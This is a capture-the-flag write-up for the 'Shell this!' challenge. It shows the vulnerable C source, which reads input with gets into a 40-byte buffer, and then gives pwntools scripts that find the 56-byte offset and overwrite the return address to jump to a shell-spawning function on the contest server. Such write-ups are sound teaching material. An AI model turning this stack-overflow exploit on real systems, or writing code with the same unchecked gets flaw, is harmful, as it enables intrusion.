# Challenge Name : Shell this!

## Description : 

Somebody told me that this program is vulnerable to something called remote code execution?

I'm not entirely sure what that is, but could you please figure it out for me?

## Anaylsis of the code and binary

Along with the binary, the source code was also provided. It looked something like this : 

```
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}

int main(void) {
    printf("Welcome! Can you figure out how to get this program to give you a shell?\n");
    vuln();
    printf("Unfortunately, you did not win. Please try again another time!\n");
}
```

Upon using checksec on the binary provided we get the following : 

```
   Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

Here NX is enabled, which means we cannot execute our own shellcode, we need to execute from the program itself.

There is a buffer size of 40 bytes and a function which calls the `/bin/sh`. 


## Bug in the program

There is a buffer overflow vulnerability in this program since the `gets` function is used. So we can overflow the buffer and redirect code execution to the `get_shell()` function, which in turn will give us the shell.

The offset of the buffer can be found using a cyclic pattern.

```
from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.log_level = 'DEBUG'
sh = gdb.debug("./shellthis")
padding = cyclic(60)
sh.sendlineafter("name: ",padding)
sh.interactive()
```

The offset will be 56. After this we can make our exploit


## Final Exploit

```
from pwn import *

context.terminal = ["tmux", "splitw", "-v"]
context.log_level = 'DEBUG'
#for local
#sh = gdb.debug("./shellthis")
#for remote
sh = remote("chal.duc.tf", 30002)
shell = p64(0x004006ca)
padding = b'a'*56
payload = padding + shell
sh.sendlineafter("name: ",payload)
sh.interactive()
```

